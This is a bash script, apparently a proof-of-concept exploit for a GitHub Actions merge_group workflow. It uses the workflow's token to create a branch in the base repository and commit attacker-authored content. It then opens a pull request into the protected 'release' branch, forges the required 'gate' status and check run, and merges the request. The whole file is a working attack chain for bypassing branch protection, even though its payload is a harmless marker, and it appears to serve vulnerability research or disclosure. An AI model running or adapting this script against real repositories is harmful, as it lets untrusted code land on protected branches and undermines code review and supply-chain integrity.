#!/bin/bash
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"; B="attacker-code-$GITHUB_RUN_ID"
st(){ local label="$1" m="$2" u="$3" body="${4:-}" code
  if [ -n "$body" ]; then code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" -d "$body" "$u")
  else code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" "$u"); fi
  echo "LND|$code|$label|$(head -c 200 /tmp/o | tr -d '\n')"; }

echo "LND|CTX|event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA"
# 1. a branch in the BASE repo at the merge-group commit
st "create-branch" POST "$API/repos/$R/git/refs" "{\"ref\":\"refs/heads/$B\",\"sha\":\"$GITHUB_SHA\"}"
# 2. ARBITRARY NON-WORKFLOW CONTENT authored by me, on that base-repo branch
st "write-attacker-code" PUT "$API/repos/$R/contents/ATTACKER-OWNED-CODE.txt" \
  "{\"message\":\"attacker-authored content\",\"content\":\"QVRUQUNLRVItT1dORUQtQ09ERS1MQU5ERUQtT04tQS1QUk9URUNURUQtQlJBTkNI\",\"branch\":\"$B\"}"
# 3. open a PR into the PROTECTED branch
curl -s -o /tmp/pr -w '' -X POST "${H[@]}" \
  -d "{\"title\":\"attacker-opened PR into release\",\"head\":\"$B\",\"base\":\"release\",\"body\":\"opened by a fork-authored merge_group job\"}" \
  "$API/repos/$R/pulls"
PRN=$(python3 -c "import json;print(json.load(open('/tmp/pr')).get('number',''))" 2>/dev/null)
PRS=$(python3 -c "import json;print(json.load(open('/tmp/pr')).get('head',{}).get('sha',''))" 2>/dev/null)
echo "LND|OPENED-PR|number=$PRN head=$PRS"
if [ -n "$PRN" ]; then
  # 4. satisfy the protected branch's required check on MY OWN new PR
  st "forge-required-check" POST "$API/repos/$R/statuses/$PRS" "{\"state\":\"success\",\"context\":\"gate\",\"description\":\"forged by the fork-authored merge_group job\"}"
  st "forge-check-run" POST "$API/repos/$R/check-runs" "{\"name\":\"gate\",\"head_sha\":\"$PRS\",\"status\":\"completed\",\"conclusion\":\"success\"}"
  sleep 12
  # 5. MERGE IT into the protected branch with the same token
  st "MERGE-INTO-PROTECTED" PUT "$API/repos/$R/pulls/$PRN/merge" "{\"merge_method\":\"merge\"}"
fi
echo "LND|DONE|land.sh completed unconditionally"
